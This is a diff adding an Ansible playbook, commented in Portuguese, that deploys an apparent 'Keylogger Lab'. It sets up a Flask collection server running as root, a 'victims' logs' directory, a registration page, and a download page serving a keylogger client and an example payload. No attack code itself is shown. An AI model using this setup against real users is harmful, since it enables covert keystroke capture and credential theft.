@@ -1,0 +1,181 @@
+---
+# Playbook Ansible para deploy do Keylogger Lab
+# Uso: ansible-playbook -i inventory.ini playbook.yml
+
+- name: Deploy Keylogger Lab Infrastructure
+  hosts: keylogger_servers
+  become: yes
+  vars:
+    project_dir: /opt/keylogger-lab
+    python_packages:
+      - flask>=3.0.0
+      - flask-cors>=4.0.0
+      - pynput>=1.7.6
+      - requests>=2.31.0
+    flask_port: 5000
+    flask_host: "0.0.0.0"
+
+  tasks:
+    # ============================================
+    # 1. INSTALACAO DE DEPENDENCIAS DO SISTEMA
+    # ============================================
+    - name: Atualizar cache do apt
+      apt:
+        update_cache: yes
+        cache_valid_time: 3600
+
+    - name: Instalar pacotes do sistema
+      apt:
+        name:
+          - python3
+          - python3-pip
+          - python3-venv
+          - git
+          - curl
+        state: present
+
+    # ============================================
+    # 2. ESTRUTURA DE DIRETORIOS
+    # ============================================
+    - name: Criar diretorio do projeto
+      file:
+        path: "{{ project_dir }}"
+        state: directory
+        mode: '0755'
+
+    - name: Criar subdiretorios
+      file:
+        path: "{{ project_dir }}/{{ item }}"
+        state: directory
+        mode: '0755'
+      loop:
+        - backend
+        - backend/logs_vitimas
+        - frontend/cadastro
+        - frontend/download
+        - frontend/download/examples
+
+    # ============================================
+    # 3. COPIAR ARQUIVOS DO BACKEND
+    # ============================================
+    - name: Copiar server.py
+      copy:
+        src: ../backend/server.py
+        dest: "{{ project_dir }}/backend/server.py"
+        mode: '0644'
+
+    - name: Copiar keylogger.py
+      copy:
+        src: ../backend/keylogger.py
+        dest: "{{ project_dir }}/backend/keylogger.py"
+        mode: '0644'
+
+    - name: Copiar requirements.txt
+      copy:
+        src: ../backend/requirements.txt
+        dest: "{{ project_dir }}/backend/requirements.txt"
+        mode: '0644'
+
+    # ============================================
+    # 4. COPIAR ARQUIVOS DO FRONTEND
+    # ============================================
+    - name: Copiar arquivos do cadastro
+      copy:
+        src: "../frontend/cadastro/{{ item }}"
+        dest: "{{ project_dir }}/frontend/cadastro/{{ item }}"
+        mode: '0644'
+      loop:
+        - index.html
+        - styles.css
+        - script.js
+
+    - name: Copiar arquivos do download
+      copy:
+        src: "../frontend/download/{{ item }}"
+        dest: "{{ project_dir }}/frontend/download/{{ item }}"
+        mode: '0644'
+      loop:
+        - keylogger-client.js
+        - download.html
+        - download-styles.css
+        - download-script.js
+
+    - name: Copiar payload de exemplo
+      copy:
+        src: ../frontend/download/examples/payload.js
+        dest: "{{ project_dir }}/frontend/download/examples/payload.js"
+        mode: '0644'
+
+    # ============================================
+    # 5. INSTALAR DEPENDENCIAS PYTHON
+    # ============================================
+    - name: Instalar pacotes Python via pip
+      pip:
+        name: "{{ python_packages }}"
+        state: present
+        executable: pip3
+
+    # ============================================
+    # 6. CRIAR SERVICO SYSTEMD
+    # ============================================
+    - name: Criar arquivo de servico systemd
+      copy:
+        dest: /etc/systemd/system/keylogger-lab.service
+        mode: '0644'
+        content: |
+          [Unit]
+          Description=Keylogger Lab Flask Server
+          After=network.target
+
+          [Service]
+          Type=simple
+          User=root
+          WorkingDirectory={{ project_dir }}/backend
+          ExecStart=/usr/bin/python3 {{ project_dir }}/backend/server.py
+          Restart=always
+          RestartSec=5
+          Environment=FLASK_ENV=production
+
+          [Install]
+          WantedBy=multi-user.target
+      notify: Reload systemd
+
+    # ============================================
+    # 7. CONFIGURAR FIREWALL (UFW)
+    # ============================================
+    - name: Instalar UFW
+      apt:
+        name: ufw
+        state: present
+
+    - name: Permitir SSH
+      ufw:
+        rule: allow
+        port: '22'
+        proto: tcp
+
+    - name: Permitir porta do Flask
+      ufw:
+        rule: allow
+        port: "{{ flask_port }}"
+        proto: tcp
+
+    - name: Habilitar UFW
+      ufw:
+        state: enabled
+        policy: deny
+      ignore_errors: yes
+
+    # ============================================
+    # 8. INICIAR SERVICO
+    # ============================================
+    - name: Habilitar e iniciar servico
+      systemd:
+        name: keylogger-lab
+        enabled: yes
+        state: started
+
+  handlers:
+    - name: Reload systemd
+      systemd:
+        daemon_reload: yes
